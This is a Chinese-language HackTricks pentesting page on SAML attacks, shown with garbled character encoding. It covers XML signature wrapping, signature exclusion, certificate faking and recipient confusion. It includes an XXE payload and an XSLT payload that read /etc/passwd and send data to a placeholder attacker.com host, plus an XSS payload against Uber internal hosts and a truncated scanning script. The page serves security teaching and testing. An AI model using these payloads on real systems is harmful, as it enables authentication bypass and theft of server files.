# SAMLæ”»å‡»

## SAMLæ”»å‡»

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## åŸºæœ¬ä¿¡æ¯

{% content-ref url="saml-basics.md" %}
[saml-basics.md](saml-basics.md)
{% endcontent-ref %}

## æ”»å‡»å›¾

![](<../../.gitbook/assets/image (535) (1) (1) (2) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (13).png>)

## å·¥å…·

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor)ï¼šä¸€ä¸ªå¯ä»¥æ¥æ”¶URLæˆ–URLåˆ—è¡¨å¹¶è¿”å›SAMLæ¶ˆè´¹URLçš„å·¥å…·ã€‚

## XMLå¾€è¿”

åœ¨XMLä¸­ï¼ŒXMLçš„ç­¾åéƒ¨åˆ†ä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œç„¶åè¿›è¡Œä¸€äº›ç¼–ç /è§£ç æ“ä½œï¼Œå¹¶è¿›è¡Œç­¾åéªŒè¯ã€‚ç†æƒ³æƒ…å†µä¸‹ï¼Œè¿™ç§ç¼–ç /è§£ç æ“ä½œä¸åº”è¯¥æ”¹å˜æ•°æ®ï¼Œä½†åŸºäºè¿™ç§æƒ…å†µï¼Œ**è¢«éªŒè¯çš„æ•°æ®å’ŒåŸå§‹æ•°æ®å¯èƒ½ä¸ç›¸åŒ**ã€‚

ä¾‹å¦‚ï¼ŒæŸ¥çœ‹ä»¥ä¸‹ä»£ç ï¼š
```ruby
require 'rexml/document'

doc = REXML::Document.new <<XML
<!DOCTYPE x [ <!NOTATION x SYSTEM 'x">]><!--'> ]>
<X>
<Y/><![CDATA[--><X><Z/><!--]]>-->
</X>
XML

puts "First child in original doc: " + doc.root.elements[1].name
doc = REXML::Document.new doc.to_s
puts "First child after round-trip: " + doc.root.elements[1].name
```
è¿è¡Œè¯¥ç¨‹åºå¯¹REXML 3.2.4æˆ–æ›´æ—©ç‰ˆæœ¬çš„ç»“æœå°†å¦‚ä¸‹æ‰€ç¤ºï¼š
```
First child in original doc: Y
First child after round-trip: Z
```
è¿™æ˜¯REXMLä»ä¸Šé¢çš„ç¨‹åºä¸­çœ‹åˆ°çš„åŸå§‹XMLæ–‡æ¡£ï¼š

![](<../../.gitbook/assets/image (561).png>)

è¿™æ˜¯å®ƒåœ¨è§£æå’Œåºåˆ—åŒ–ä¸€è½®åçœ‹åˆ°çš„ï¼š

![](<../../.gitbook/assets/image (562).png>)

æœ‰å…³æ­¤æ¼æ´åŠå…¶æ»¥ç”¨æ–¹æ³•çš„æ›´å¤šä¿¡æ¯ï¼š

* [https://mattermost.com/blog/securing-xml-implementations-across-the-web/](https://mattermost.com/blog/securing-xml-implementations-across-the-web/)
* [https://joonas.fi/2021/08/saml-is-insecure-by-design/](https://joonas.fi/2021/08/saml-is-insecure-by-design/)

## XMLç­¾ååŒ…è£…æ”»å‡»

åŒ…å«XMLç­¾åçš„XMLæ–‡æ¡£é€šå¸¸åœ¨ä¸¤ä¸ªç‹¬ç«‹çš„æ­¥éª¤ä¸­è¿›è¡Œå¤„ç†ï¼šç­¾åéªŒè¯å’ŒåŠŸèƒ½è°ƒç”¨ï¼ˆä¸šåŠ¡é€»è¾‘ï¼‰ã€‚å¦‚æœä¸¤ä¸ªæ¨¡å—å¯¹æ•°æ®æœ‰ä¸åŒçš„è§‚ç‚¹ï¼Œåˆ™å­˜åœ¨ä¸€ç§åä¸ºXMLç­¾ååŒ…è£…æ”»å‡»ï¼ˆXSWï¼‰çš„æ–°å‹æ¼æ´ã€‚\
åœ¨è¿™äº›æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…é€šè¿‡æ³¨å…¥ä¼ªé€ çš„å…ƒç´ æ¥ä¿®æ”¹æ¶ˆæ¯ç»“æ„ï¼Œè¿™äº›å…ƒç´ ä¸ä¼šä½¿XMLç­¾åå¤±æ•ˆã€‚æ­¤ä¿®æ”¹çš„ç›®çš„æ˜¯ä»¥è¿™æ ·çš„æ–¹å¼æ”¹å˜æ¶ˆæ¯ï¼Œä½¿åº”ç”¨ç¨‹åºé€»è¾‘å’Œç­¾åéªŒè¯æ¨¡å—ä½¿ç”¨æ¶ˆæ¯çš„ä¸åŒéƒ¨åˆ†ã€‚å› æ­¤ï¼Œæ¥æ”¶è€…æˆåŠŸéªŒè¯XMLç­¾åï¼Œä½†åº”ç”¨ç¨‹åºé€»è¾‘å¤„ç†ä¼ªé€ çš„å…ƒç´ ã€‚æ”»å‡»è€…å› æ­¤ç»•è¿‡äº†XMLç­¾åçš„å®Œæ•´æ€§ä¿æŠ¤å’Œæºèº«ä»½éªŒè¯ï¼Œå¹¶å¯ä»¥æ³¨å…¥ä»»æ„å†…å®¹ã€‚

ä»SAMLè¯·æ±‚ä¸­ï¼š

![](<../../.gitbook/assets/image (537).png>)

### XSW #1

æ”»å‡»è€…å¯ä»¥åœ¨æ‰¾åˆ°ç­¾åçš„åœ°æ–¹æ·»åŠ ä¸€ä¸ªæ–°çš„æ ¹å…ƒç´ ã€‚å› æ­¤ï¼Œå½“éªŒè¯å™¨æ£€æŸ¥ç­¾åçš„å®Œæ•´æ€§æ—¶ï¼Œå®ƒå¯èƒ½ä¼šæ³¨æ„åˆ°å®ƒå·²ç»æ£€æŸ¥äº†Response -> Assertion -> Subjectçš„å®Œæ•´æ€§ï¼Œå¹¶ä¸”å¯èƒ½ä¼šå¯¹çº¢è‰²çš„é‚ªæ¶æ–°Response -> Assertion -> Subjectè·¯å¾„æ„Ÿåˆ°å›°æƒ‘ï¼Œå¹¶ä½¿ç”¨å…¶æ•°æ®ã€‚

![](<../../.gitbook/assets/image (538).png>)

### XSW #2

ä¸ï¼ƒ1çš„åŒºåˆ«åœ¨äºï¼Œä½¿ç”¨çš„ç­¾åç±»å‹æ˜¯åˆ†ç¦»çš„ç­¾åï¼Œè€ŒXSWï¼ƒ1ä½¿ç”¨çš„æ˜¯åŒ…è£…ç­¾åã€‚\
è¯·æ³¨æ„ï¼Œæ–°çš„é‚ªæ¶ç»“æ„ä¸ä¹‹å‰ç›¸åŒï¼Œè¯•å›¾åœ¨å®Œæ•´æ€§æ£€æŸ¥æ‰§è¡Œåæ··æ·†ä¸šåŠ¡é€»è¾‘ã€‚

![](<../../.gitbook/assets/image (539).png>)

### XSW #3

åœ¨è¿™ç§æ”»å‡»ä¸­ï¼Œæ¶æ„Assertionåœ¨ä¸åŸå§‹Assertionç›¸åŒçº§åˆ«çš„ä½ç½®ä¸Šåˆ›å»ºï¼Œä»¥è¯•å›¾æ··æ·†ä¸šåŠ¡é€»è¾‘å¹¶ä½¿ç”¨æ¶æ„æ•°æ®ã€‚

![](<../../.gitbook/assets/image (540).png>)

### XSW #4

XSWï¼ƒ4ä¸ï¼ƒ3ç±»ä¼¼ï¼Œåªæ˜¯åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒåŸå§‹Assertionæˆä¸ºå¤åˆ¶çš„Assertionçš„å­çº§ã€‚

![](<../../.gitbook/assets/image (541).png>)

### XSW #5

åœ¨XSWï¼ƒ5ä¸­ï¼Œç­¾åå’ŒåŸå§‹Assertionä¸å±äºä¸‰ç§æ ‡å‡†é…ç½®ä¹‹ä¸€ï¼ˆåŒ…å«/åŒ…è£…/åˆ†ç¦»ï¼‰ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¤åˆ¶çš„AssertionåŒ…å«ç­¾åã€‚

![](<../../.gitbook/assets/image (542).png>)

### XSW #6

XSWï¼ƒ6å°†å…¶å¤åˆ¶çš„Assertionæ’å…¥ä¸ï¼ƒ4å’Œï¼ƒ5ç›¸åŒçš„ä½ç½®ã€‚è¿™é‡Œæœ‰è¶£çš„éƒ¨åˆ†æ˜¯å¤åˆ¶çš„AssertionåŒ…å«ç­¾åï¼Œè€Œç­¾ååˆåŒ…å«åŸå§‹Assertionã€‚

![](<../../.gitbook/assets/image (543).png>)

### XSW #7

XSWï¼ƒ7æ’å…¥ä¸€ä¸ªExtensionså…ƒç´ ï¼Œå¹¶å°†å¤åˆ¶çš„Assertionä½œä¸ºå­å…ƒç´ æ·»åŠ ã€‚Extensionsæ˜¯ä¸€ä¸ªå…·æœ‰è¾ƒå°‘é™åˆ¶çš„æ¨¡å¼å®šä¹‰çš„æœ‰æ•ˆXMLå…ƒç´ ã€‚è¿™ç¯‡[ç™½çš®ä¹¦](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf)çš„ä½œè€…ä»¬é’ˆå¯¹OpenSAMLåº“å¼€å‘äº†è¿™ç§æ–¹æ³•ã€‚OpenSAMLä½¿ç”¨æ¨¡å¼éªŒè¯æ¥æ­£ç¡®æ¯”è¾ƒç­¾åéªŒè¯æœŸé—´ä½¿ç”¨çš„IDä¸å¤„ç†çš„Assertionçš„IDã€‚ä½œè€…ä»¬å‘ç°ï¼Œå¦‚æœå…·æœ‰ä¸åŸå§‹Assertionç›¸åŒIDçš„å¤åˆ¶çš„Assertionsæ˜¯å…·æœ‰è¾ƒå°‘é™åˆ¶çš„æ¨¡å¼å®šä¹‰çš„å…ƒç´ çš„å­å…ƒç´ ï¼Œä»–ä»¬èƒ½å¤Ÿç»•è¿‡è¿™ä¸ªç‰¹å®šçš„å¯¹ç­–ã€‚

![](<../../.gitbook/assets/image (544).png>)

### XSW #8

XSWï¼ƒ8ä½¿ç”¨å¦ä¸€ä¸ªè¾ƒå°‘é™åˆ¶çš„XMLå…ƒç´ æ¥æ‰§è¡ŒXSWï¼ƒ7ä¸­ä½¿ç”¨çš„æ”»å‡»æ¨¡å¼çš„å˜ä½“ã€‚è¿™æ¬¡ï¼ŒåŸå§‹Assertionæ˜¯è¾ƒå°‘é™åˆ¶å…ƒç´ çš„å­å…ƒç´ ï¼Œè€Œä¸æ˜¯å¤åˆ¶çš„Assertionã€‚

![](<../../.gitbook/assets/image (545).png>)

### å·¥å…·

æ‚¨å¯ä»¥ä½¿ç”¨Burpæ‰©å±•ç¨‹åº[SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)æ¥è§£æè¯·æ±‚ï¼Œåº”ç”¨æ‚¨é€‰æ‹©çš„ä»»ä½•XSWæ”»å‡»å¹¶å¯åŠ¨å®ƒã€‚

![](<../../.gitbook/assets/image (546).png>)

### åŸå§‹è®ºæ–‡

æœ‰å…³æ­¤æ”»å‡»çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·é˜…è¯»åŸå§‹è®ºæ–‡[https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf)

## XXE

å¦‚æœæ‚¨ä¸çŸ¥é“XXEæ˜¯å“ªç§æ”»å‡»ï¼Œè¯·é˜…è¯»ä»¥ä¸‹é¡µé¢ï¼š

{% content-ref url="../xxe-xee-xml-external-entity.md" %}
[xxe-xee-xml-external-entity.md](../xxe-xee-xml-external-entity.md)
{% endcontent-ref %}

ç”±äºSAMLå“åº”æ˜¯è¢«å‹ç¼©å’Œbase64ç¼–ç çš„XMLæ–‡æ¡£ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ“çºµä½œä¸ºSAMLå“åº”å‘é€çš„XMLæ–‡æ¡£æ¥æµ‹è¯•XXEã€‚ä¾‹å¦‚ï¼š
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY    file SYSTEM "file:///etc/passwd">
<!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
<samlp:Response ... ID="_df55c0bb940c687810b436395cf81760bb2e6a92f2" ...>
<saml:Issuer>...</saml:Issuer>
<ds:Signature ...>
<ds:SignedInfo>
<ds:CanonicalizationMethod .../>
<ds:SignatureMethod .../>
<ds:Reference URI="#_df55c0bb940c687810b436395cf81760bb2e6a92f2">...</ds:Reference>
</ds:SignedInfo>
<ds:SignatureValue>...</ds:SignatureValue>
[...]
```
### å·¥å…·

æ‚¨è¿˜å¯ä»¥ä½¿ç”¨Burpæ‰©å±•ç¨‹åº[SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)ä»SAMLè¯·æ±‚ç”ŸæˆPOCï¼Œä»¥æµ‹è¯•å¯èƒ½çš„XXEæ¼æ´ã€‚

è¿˜å¯ä»¥æŸ¥çœ‹è¿™ä¸ªè®²åº§ï¼š[https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## é€šè¿‡SAMLè¿›è¡ŒXSLTæ”»å‡»

æœ‰å…³XSLTçš„æ›´å¤šä¿¡æ¯ï¼Œè¯·è®¿é—®ï¼š

{% content-ref url="../xslt-server-side-injection-extensible-stylesheet-languaje-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-languaje-transformations.md](../xslt-server-side-injection-extensible-stylesheet-languaje-transformations.md)
{% endcontent-ref %}

å¯æ‰©å±•æ ·å¼è¡¨è¯­è¨€è½¬æ¢ï¼ˆXSLTï¼‰æ˜¯ä¸€ç§ç”¨äºå°†XMLæ–‡æ¡£è½¬æ¢ä¸ºå…¶ä»–æ–‡æ¡£ç±»å‹ï¼ˆå¦‚HTMLã€JSONæˆ–PDFï¼‰çš„å›¾çµå®Œå¤‡è¯­è¨€ã€‚éœ€è¦æ³¨æ„çš„ä¸€ä¸ªé‡è¦æ–¹é¢æ˜¯**æ”»å‡»ä¸éœ€è¦æœ‰æ•ˆçš„ç­¾åæ‰èƒ½æˆåŠŸ**ã€‚åŸå› æ˜¯**XSLTè½¬æ¢åœ¨æ•°å­—ç­¾åè¢«å¤„ç†éªŒè¯ä¹‹å‰å‘ç”Ÿ**ã€‚åŸºæœ¬ä¸Šï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªå·²ç­¾åçš„SAMLå“åº”æ¥æ‰§è¡Œæ”»å‡»ï¼Œä½†ç­¾åå¯ä»¥æ˜¯è‡ªç­¾åæˆ–æ— æ•ˆçš„ã€‚

![xslt](https://epi052.gitlab.io/notes-to-self/img/saml/xslt.png)

åœ¨è¿™é‡Œï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ä¸€ä¸ª**POC**æ¥æ£€æŸ¥æ­¤ç±»æ¼æ´ï¼Œåœ¨æœ¬èŠ‚å¼€å¤´æåˆ°çš„hacktricksé¡µé¢ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°æœ‰æ•ˆè½½è·ã€‚
```markup
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
...
<ds:Transforms>
<ds:Transform>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="doc">
<xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
<xsl:variable name="escaped" select="encode-for-uri($file)"/>
<xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
<xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
<xsl:value-of select="unparsed-text($exploitUrl)"/>
</xsl:template>
</xsl:stylesheet>
</ds:Transform>
</ds:Transforms>
...
</ds:Signature>
```
### å·¥å…·

æ‚¨è¿˜å¯ä»¥ä½¿ç”¨Burpæ‰©å±•ç¨‹åº[SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)ä»SAMLè¯·æ±‚ç”ŸæˆPOCï¼Œä»¥æµ‹è¯•å¯èƒ½å­˜åœ¨çš„XSLTæ¼æ´ã€‚

è¿˜å¯ä»¥æŸ¥çœ‹æ­¤æ¼”è®²ï¼š[https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XMLç­¾åæ’é™¤ <a href="#xml-signature-exclusion" id="xml-signature-exclusion"></a>

ç­¾åæ’é™¤ç”¨äºæµ‹è¯•SAMLå®ç°åœ¨**æ²¡æœ‰ç­¾åå…ƒç´ **æ—¶çš„è¡Œä¸ºã€‚å½“ç­¾åå…ƒç´ **ä¸å­˜åœ¨**æ—¶ï¼Œ**ç­¾åéªŒè¯æ­¥éª¤å¯èƒ½ä¼šè¢«å®Œå…¨è·³è¿‡**ã€‚å¦‚æœæœªéªŒè¯ç­¾åï¼Œåˆ™æ”»å‡»è€…å¯èƒ½ç¯¡æ”¹é€šå¸¸ä¼šè¢«ç­¾åçš„ä»»ä½•å†…å®¹ã€‚

![](<../../.gitbook/assets/image (547).png>)

### å·¥å…· <a href="#xml-signature-exclusion-how-to" id="xml-signature-exclusion-how-to"></a>

ç­¾åæ’é™¤å§‹äºæ‹¦æˆªSAMLå“åº”ï¼Œç„¶åç‚¹å‡»â€œåˆ é™¤ç­¾åâ€ã€‚è¿™æ ·åšä¼šåˆ é™¤**æ‰€æœ‰**ç­¾åå…ƒç´ ã€‚

![sig-exclusion](https://epi052.gitlab.io/notes-to-self/img/saml/sig-exclusion.png)

åˆ é™¤ç­¾ååï¼Œå…è®¸è¯·æ±‚ç»§ç»­å‘é€åˆ°ç›®æ ‡ã€‚å¦‚æœæœåŠ¡ä¸éœ€è¦ç­¾å

## è¯ä¹¦ä¼ªé€  <a href="#certificate-faking" id="certificate-faking"></a>

è¯ä¹¦ä¼ªé€ æ˜¯æµ‹è¯•æœåŠ¡æä¾›å•†æ˜¯å¦**éªŒè¯å—ä¿¡ä»»çš„èº«ä»½æä¾›å•†ç­¾ç½²çš„SAMLæ¶ˆæ¯**çš„è¿‡ç¨‹ã€‚SPå’ŒIdPä¹‹é—´çš„ä¿¡ä»»å…³ç³»åœ¨æ¯æ¬¡æ¥æ”¶åˆ°SAMLæ¶ˆæ¯æ—¶éƒ½ä¼šå»ºç«‹å’Œ**éªŒè¯**ã€‚è¿™å½’ç»“ä¸ºä½¿ç”¨**è‡ªç­¾å**è¯ä¹¦å¯¹SAMLå“åº”æˆ–æ–­è¨€è¿›è¡Œç­¾åã€‚

### å·¥å…· <a href="#certificate-faking-how-to" id="certificate-faking-how-to"></a>

å°†ä½¿ç”¨Burpæ‰©å±•ç¨‹åº[SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)ã€‚\
è¦ä¼ªé€ è¯ä¹¦ï¼Œè¯·å…ˆæ‹¦æˆªSAMLå“åº”ã€‚\
å¦‚æœå“åº”ä¸­åŒ…å«ç­¾åï¼Œè¯·ä½¿ç”¨â€œå°†è¯ä¹¦å‘é€åˆ°SAML Raider Certsâ€æŒ‰é’®ã€‚

![send-cert](https://epi052.gitlab.io/notes-to-self/img/saml/send-cert.png)

å‘é€è¯ä¹¦åï¼Œæˆ‘ä»¬åº”è¯¥åœ¨SAML Raider Certificatesé€‰é¡¹å¡ä¸­çœ‹åˆ°ä¸€ä¸ªå¯¼å…¥çš„è¯ä¹¦ã€‚ç„¶åï¼Œæˆ‘ä»¬çªå‡ºæ˜¾ç¤ºå¯¼å…¥çš„è¯ä¹¦å¹¶æŒ‰ä¸‹â€œä¿å­˜å¹¶è‡ªç­¾åâ€æŒ‰é’®ã€‚

![sent-cert](https://epi052.gitlab.io/notes-to-self/img/saml/sent-cert.png)

è¿™æ ·åšä¼šç”ŸæˆåŸå§‹è¯ä¹¦çš„è‡ªç­¾åå…‹éš†ã€‚ç°åœ¨æ˜¯æ—¶å€™å›åˆ°Burpçš„ä»£ç†ä¸­æ‹¦æˆªçš„è¯·æ±‚äº†ã€‚é¦–å…ˆï¼Œä»XMLç­¾åä¸‹æ‹‰èœå•ä¸­é€‰æ‹©æ–°çš„è‡ªç­¾åè¯ä¹¦ã€‚ç„¶åä½¿ç”¨â€œåˆ é™¤ç­¾åâ€æŒ‰é’®åˆ é™¤ä»»ä½•ç°æœ‰çš„ç­¾åã€‚æœ€åï¼Œä½¿ç”¨**â€œ(é‡æ–°)ç­¾ç½²æ¶ˆæ¯â€**æˆ–**`(é‡æ–°)ç­¾ç½²æ–­è¨€`**æŒ‰é’®ï¼ˆæ ¹æ®æ‚¨çš„å…·ä½“æƒ…å†µé€‰æ‹©**æ›´åˆé€‚**çš„æŒ‰é’®ï¼‰ã€‚

![remove-sig](https://epi052.gitlab.io/notes-to-self/img/saml/remove-sig.png)

ä½¿ç”¨è‡ªç­¾åè¯ä¹¦å¯¹æ¶ˆæ¯è¿›è¡Œç­¾ååï¼Œå°†å…¶å‘é€å‡ºå»ã€‚å¦‚æœæˆ‘ä»¬æˆåŠŸè¿›è¡Œèº«ä»½éªŒè¯ï¼Œå°±è¯´æ˜æˆ‘ä»¬å¯ä»¥å¯¹SAMLæ¶ˆæ¯è¿›è¡Œç­¾åã€‚å¯¹SAMLæ¶ˆæ¯è¿›è¡Œç­¾åçš„èƒ½åŠ›æ„å‘³ç€æˆ‘ä»¬å¯ä»¥æ›´æ”¹æ–­è¨€ä¸­çš„å€¼ï¼Œå¹¶ä¸”æœåŠ¡æä¾›å•†å°†æ¥å—è¿™äº›æ›´æ”¹ã€‚

## ä»¤ç‰Œæ¥æ”¶è€…æ··æ·†/æœåŠ¡æä¾›å•†ç›®æ ‡æ··æ·† <a href="#token-recipient-confusion" id="token-recipient-confusion"></a>

ä»¤ç‰Œæ¥æ”¶è€…æ··æ·†/æœåŠ¡æä¾›å•†ç›®æ ‡æ··æ·†**æµ‹è¯•æœåŠ¡æä¾›å•†æ˜¯å¦éªŒè¯æ¥æ”¶è€…**ã€‚è¿™æ„å‘³ç€ï¼Œ**å¦‚æœå“åº”æ˜¯ä¸ºä¸åŒçš„æœåŠ¡æä¾›å•†è€Œè®¾è®¡çš„**ï¼Œ**å½“å‰**æœåŠ¡æä¾›å•†åº”è¯¥æ³¨æ„åˆ°å¹¶**æ‹’ç»è®¤è¯**ã€‚\
**æ¥æ”¶è€…**å­—æ®µæ˜¯SAMLå“åº”ä¸­çš„Subjectå…ƒç´ çš„å­å…ƒç´ SubjectConfirmationDataå…ƒç´ çš„å±æ€§ã€‚

> SubjectConfirmationDataå…ƒç´ æŒ‡å®šå…è®¸ç¡®è®¤ä¸»ä½“æˆ–çº¦æŸä¸»ä½“ç¡®è®¤è¡Œä¸ºå‘ç”Ÿçš„æƒ…å†µä¸‹çš„é™„åŠ æ•°æ®ã€‚å½“ä¾èµ–æ–¹è¯•å›¾éªŒè¯æå‡ºæ–­è¨€çš„å®ä½“ï¼ˆå³ï¼Œè¯æ˜å®ä½“ï¼‰ä¸æ–­è¨€ä¸»é¢˜çš„å£°æ˜ä¹‹é—´çš„å…³ç³»æ—¶ï¼Œä¸»ä½“ç¡®è®¤å‘ç”Ÿã€‚

åœ¨SubjectConfirmationDataå…ƒç´ ä¸Šæ‰¾åˆ°çš„æ¥æ”¶è€…å±æ€§æ˜¯æŒ‡å®šå¿…é¡»ä¼ é€’æ–­è¨€çš„ä½ç½®çš„URLã€‚å¦‚æœæ¥æ”¶è€…æ˜¯ä¸æ¥æ”¶å®ƒçš„æœåŠ¡æä¾›å•†ä¸åŒçš„æœåŠ¡æä¾›å•†ï¼Œåˆ™ä¸åº”æ¥å—æ–­è¨€ã€‚

### å¦‚ä½• <a href="#token-recipient-confusion-how-to" id="token-recipient-confusion-how-to"></a>

SAMLä»¤ç‰Œæ¥æ”¶è€…æ··æ·†ï¼ˆSAML-TRCï¼‰åœ¨æˆ‘ä»¬å°è¯•åˆ©ç”¨ä¹‹å‰æœ‰ä¸€äº›å…ˆå†³æ¡ä»¶ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬**éœ€è¦åœ¨æœåŠ¡æä¾›å•†ä¸Šæ‹¥æœ‰åˆæ³•å¸æˆ·**ã€‚å…¶æ¬¡ï¼Œ**SP-Targetå¿…é¡»æ¥å—ç”±æœåŠ¡SP-Legitæä¾›çš„ä»¤ç‰Œ**ã€‚

å¦‚æœæ¡ä»¶ä¸ºçœŸï¼Œåˆ™æ”»å‡»ç›¸å¯¹ç®€å•ã€‚æˆ‘ä»¬é€šè¿‡å…±äº«çš„èº«ä»½æä¾›å•†å¯¹**SP-Legitè¿›è¡Œèº«ä»½éªŒè¯**ã€‚ç„¶åï¼Œæˆ‘ä»¬**æ‹¦æˆªä»IdPå‘é€åˆ°SP-Legitçš„SAMLå“åº”**ã€‚ä¸€æ—¦æ‹¦æˆªåˆ°ï¼Œæˆ‘ä»¬å°†**å°†åŸæœ¬ç”¨äºSP-Legitçš„SAMLå“åº”å‘é€åˆ°SP-Target**ã€‚å¦‚æœ**SP-Targetæ¥å—æ–­è¨€**ï¼Œæˆ‘ä»¬å°†å‘ç°è‡ªå·±ä»¥ä¸SP-Legitç›¸åŒçš„å¸æˆ·åç™»å½•ï¼Œå¹¶è·å¾—è®¿é—®SP-Targetç›¸åº”èµ„æºçš„æƒé™ã€‚

## æ³¨é”€åŠŸèƒ½ä¸­çš„XSSæ¼æ´

ï¼ˆè®¿é—®[åŸå§‹ç ”ç©¶](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/)ï¼‰

åœ¨æ‰§è¡Œç›®å½•çˆ†ç ´åï¼Œæˆ‘æ‰¾åˆ°äº†ä»¥ä¸‹é¡µé¢ï¼š
```
https://carbon-prototype.uberinternal.com:443/oidauth/logout
```
è¿™æ˜¯ä¸€ä¸ªæ³¨é”€é¡µé¢ï¼Œæˆ‘æ‰“å¼€äº†ä¸Šé¢çš„é“¾æ¥ï¼Œå®ƒå°†æˆ‘é‡å®šå‘åˆ°ä»¥ä¸‹é¡µé¢
```
https://carbon-prototype.uberinternal.com/oidauth/prompt?base=https%3A%2F%2Fcarbon-prototype.uberinternal.com%3A443%2Foidauth&return_to=%2F%3Fopenid_c%3D1542156766.5%2FSnNQg%3D%3D&splash_disabled=1
```
baseå‚æ•°æ¥å—ä¸€ä¸ªURLï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°†å…¶æ›¿æ¢ä¸ºç»å…¸çš„`javascript:alert(123);`æ¥è§¦å‘XSSæ¼æ´ã€‚

### å¤§è§„æ¨¡åˆ©ç”¨

ä½¿ç”¨[SAMLExtractor](https://github.com/fadyosman/SAMLExtractor)å·¥å…·ï¼Œå®ƒå¯ä»¥æ¥å—ä¸€ä¸ªURLåˆ—è¡¨ï¼Œå¹¶è¿”å›å›è°ƒï¼ˆSAMLæ¶ˆè´¹ï¼‰URLã€‚æˆ‘å†³å®šå°†`uberinternal.com`çš„æ‰€æœ‰å­åŸŸåæä¾›ç»™è¯¥å·¥å…·ï¼Œä»¥æŸ¥çœ‹æ˜¯å¦æœ‰å…¶ä»–ä½¿ç”¨ç›¸åŒåº“çš„åŸŸåï¼Œç»“æœå‘ç°äº†ä¸€ä¸ªã€‚

æ¥ä¸‹æ¥ï¼Œæˆ‘åˆ›å»ºäº†ä¸€ä¸ªè„šæœ¬ï¼Œè°ƒç”¨äº†æ˜“å—æ”»å‡»çš„é¡µé¢`oidauth/prompt`ï¼Œå¹¶å°è¯•è¿›è¡ŒXSSæ”»å‡»ã€‚å¦‚æœæˆ‘çš„è¾“å…¥è¢«åå°„å›æ¥ï¼Œå°±ä¼šæ˜¾ç¤ºä¸€ä¸ªæ˜“å—æ”»å‡»çš„æ¶ˆæ¯ã€‚
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import init ,Fore, Back, Style
init()

with open("/home/fady/uberSAMLOIDAUTH") as urlList:
for url in urlList:
